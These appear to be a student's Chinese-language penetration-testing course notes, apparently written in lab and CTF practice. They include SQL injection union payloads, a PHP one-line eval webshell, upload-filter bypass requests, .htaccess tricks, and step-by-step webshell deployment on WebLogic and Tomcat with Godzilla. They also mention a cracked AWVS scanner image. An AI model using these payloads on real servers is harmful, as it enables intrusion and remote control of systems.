# Day1

## 网络安全基础
形式很严峻，我们要重视

### 操作系统安全
Linux/Windows：密码、进程、日志

### 协议与网络架构
ISO/OSI七层模型结构

### 数据库安全

### 密码学基础
1. 加解密：
对称密码算法: DES, IDEA, AES
非对称密码算法（公钥、私钥）: RSA, ECC, ElGamal

2. 哈希运算（完整性）：
MD5(128位)、SHA(160位)

# Day2

## sql 注入
- 1' union select 1,2,3 #
- Id=1’
- Id=1’ and 1=1 --+  --#
- Id=1’ ordey by 2 --+
- Id=-1’ union select 1,2,3 --+
- Id=-1’union select 1,database(),username() --+
查表
- Id=1’ union select 1,2,group_concat(table_name) from information_schema.tabless where table_schema=’&&&’ 
查列
- Id=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’ 
出数据
- Id=1’ union select 1,2,group_concat(column_name,比如username\password) from  users  

## 信息收集
https://search.censys.io/
https://www.virustotal.com/gui/home/search
https://fofa.info/
https://hunter.qianxin.com/
https://www.shodan.io/
https://www.zoomeye.org/
https://detail.aiuys.com/

# Day3

## 增强 Linux 系统的命令历史记录（history）功能脚本
使其记录更详细的用户操作日志，包括 执行时间、登录 IP 地址、用户名，并确保历史记录实时保存，避免丢失。
```sh
USER_IP=`who -u am i 2>/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'`
if [ "$USER_IP" = "" ]
then
USER_IP=`hostname`
fi
export HISTTIMEFORMAT="%F %T $USER_IP `whoami` "
shopt -s histappend
export PROMPT_COMMAND="history -a"
```

## 安装和使用 suricata
```sh
# 在 wsl 中安装
sudo apt-get install suricata
# 更新规则
sudo suricata-update
# 离线 PCAP 分析，生成日志文件 fast.log, eve.json
suricata -r file.pcap -l ./output
# 如果 Flag 藏在 HTTP 请求或 DNS 查询中，可以：
grep "flag{" ./output/eve.json  # 查找 flag{...}
```

## 应急响应实战笔记.pdf

## vulhub
Vulhub是一个面向安全研究人员和教育工作者的开源预构建漏洞Docker环境集合。
```sh
# 克隆仓库
git clone --depth 1 https://github.com/vulhub/vulhub.git
# 进入任何一个漏洞目录
cd vulhub/spring/CVE-2022-22947
# 启动环境
docker compose up -d
```

# Day4

## 漏洞检测工具
- [nmap](https://nmap.org/)
- [xray](https://github.com/chaitin/xray)
- [URLFinder](https://github.com/pingc0y/URLFinder)
- [EHole_magic](https://github.com/lemonlove7/EHole_magic)
- [nuclei](https://github.com/projectdiscovery/nuclei)
- BBscan 
- FScan

## nuclei
https://github.com/projectdiscovery/nuclei

1. install go
https://golang.google.cn/dl/
2. install nuclei
```sh
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
```

## awvs漏扫
```sh
# 下载破解版 awvs 镜像
docker pull 0xgkd/awvs
docker run -it -d -p 13443:3443 0xgkd/awvs
# Login Credentials:
username: admin@gkd.com⁠
password: Oxgkd123
```

## Spring Boot 相关漏洞学习资料，利用方法和技巧合集
https://github.com/LandGrey/SpringBootVulExploit/tree/master

# Day5

数据泄露很常见
[搜索引擎 FOFA](https://fofa.info/): FOFA是一款专注于网络空间测绘和资产探测的搜索引擎，主要用于网络安全领域的资产发现、漏洞扫描和威胁情报收集。

## webshell (文件上传)
网页木马后门，上传文件

一句话木马 `pass.php`
```php
<?php eval($_POST["pass"]);?>
```

### pass1 客户端 js 验证
禁用网页js（使用插件Quick Javascript Switcher）,或者使用burpsuit。上传 webshell
```
------WebKitFormBoundarykQoJzWfXWa1VBSZj
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png

<?php
eval($_POST["pass"]);

------WebKitFormBoundarykQoJzWfXWa1VBSZj
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundarykQoJzWfXWa1VBSZj--
```
然后使用菜刀、蚁剑、Godzilla打开上传文件的地址`xxxx/upload/shell.php`

### pass2 服务器文件类型验证
上传文件时，明确 `Content-Type: image/png`， 方法同上

### pass3 服务器文件后缀验证
上传文件时，文件后缀可以尝试 `.php .phtml .phps .php5 .pht`，方法同上

### pass4 服务器 `Apache .htaccess` 配置文件验证
方案1：
添加无法解析的后缀如 `pass4.php.xxxx` 绕过验证。一句话木马可以尝试使用 `<?php echo(phpinfo());?>` 来验证。
上传成功后访问 `http://xxxxx/upload/pass4.php.xxxx` 来验证。
方案2：
利用.htaccess来把含有php语言的图片，能够作为脚本处理。以下是 .htaccess 文件内容
```
<FilesMatch "pass4.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```
上传后尝试打开：`http://xxxxx/upload/.htaccess` 如果返回403，证明已经上传成功。
然后将一句话木马用 `.jpg` 文件后缀进行上传，然后网站就会将 .jpg 作为 php 来解析了。
`http://xxxxx/upload/pass4.jpg`

### pass5 大小写绕过
使用 `.PHp` 后缀上传 webshell

### pass6 空格绕过
使用 `.php ` 后缀上传 webshell

### pass7 点绕过
使用 `.php.` 后缀上传 webshell

### pass8 `::$DATA`绕过
NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与 Macintosh 文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为`$DATA`。上传`.php::$DATA`绕过。(仅限windows)

### pass9 空格和点绕过
看代码可以看出它只去掉一次空格和点。
上传文件名使用`pass9.php. .`

### pass10 双写绕过
看代码可以看出它将敏感后缀替换为空，双写后缀`.pphphp`绕过。

### pass11 `%00`截断
上传文件发现url会变成
`http://2dda8eda-de3d-48b9-b100-bd03798a6f40.node5.buuoj.cn:81/Pass-11/index.php?save_path=../upload/`
尝试将后面改为 `?save_path=../upload/pass11.php%00`
说是对php版本有要求，无法完成

### pass12
与11一样，不过是 post 方法。php版本有要求，无法完成

### pass13、pass14、pass15
要制造图片马，这里可以使用 yakit 给一句话木马添加图片头
```
------WebKitFormBoundaryhOLXPRsLUETYPM5H
Content-Disposition: form-data; name="upload_file"; filename="pass13.jpg"
Content-Type: application/octet-stream

{{jpg()}}--<?php eval($_POST["pass"]);?>
```
发送成功后网页会返回上传文件的地址 `../upload/9620250412061349.jpg`
连接时要使用 include.php 这个入口来包含文件。可以直接用蚁剑来连接。
`http://116.196.112.253:20080/include.php?file=upload/9620250412061349.jpg`

pass14和15是一样的，将yakit的图片头换成 `{{png()}}--<?php eval($_POST["pass"]);?>`，`{{gif()}}--<?php eval($_POST["pass"]);?>`即可

### pass16 二次渲染绕过
看代码会发现上传的图片被服务器重新渲染修改了，jpg 和 png 逆向改动有些麻烦，看教程说 gif 相对容易，可是还是没搞定。
这里只使用 windows 的 copy 命令成功将木马添加在了图片的末尾（不能用powershell，只能用cmd）：
`copy /b test.gif + pass.php pass.gif`
但是根据教程修改下载下来的 gif 的 hex 后，服务器认为不是 gif 文件了。

### pass17-20 太麻烦了，不想搞了

## sql 注入
使用 sqlmap，需要改造

## 命令执行漏洞

## 渗透测试流程

信息收集 -> web漏洞扫描/服务器漏洞挖掘 -> 人员信息收集/C段、同IP、子域名主机安全检测 -> 漏洞整理、报告生成

## 攻击 WebLogic 服务
1. 使用 fscan 扫描漏洞类型
`.\fscan.exe -u http://116.196.112.253:7002/`
2. 使用 WeblogicExploit-GUI 上传 webshell
选择漏洞类型，都可以试试，可以使用“注入内存马”，也可以使用“一键写入webshell”，然后根据选择的工具连接目标机
2.1 蚁剑（功能较少，只能查看目录和文件）
根据 WeblogicExploit-GUI 的提示添加 url，选择 Custom 类型即可。
2.2 哥斯拉 GodZilla（功能较多，能上传，能发命令）
根据 WeblogicExploit-GUI 的提示添加 url，修改密码，秘钥不改，有效载荷改为 jsp
2.3 冰蝎 Behinder
根据 WeblogicExploit-GUI 的提示添加 url

## 攻击 Tomcat 服务
1. 使用 Godzilla 生成 war 包
管理 -> 生成 -> Java -> 生成， 保存为 attack.jsp
2. 生成 war 包
```
'C:\Program Files\Java\jdk-21\bin\jar.exe' -cvf .\attack.war *
```
3. 在 manager 页面上传 war 包
`http://172.19.0.2:8080/manager/html` 上传 war 包后部署
4. 访问部署的 jsp 文件
`http://172.19.0.2:8080/attack/attack.jsp`，空白页表示上传并部署成功。
5. 使用 Godzilla 连接
目标 -> 添加
url: `http://172.19.0.2:8080/attack/attack.jsp`
如果使用了代理可以根据实际情况添加代理：（如果是跳板机，可以在跳板机上使用 frp 启动代理）
代理主机：116.196.112.253
代理端口：30018
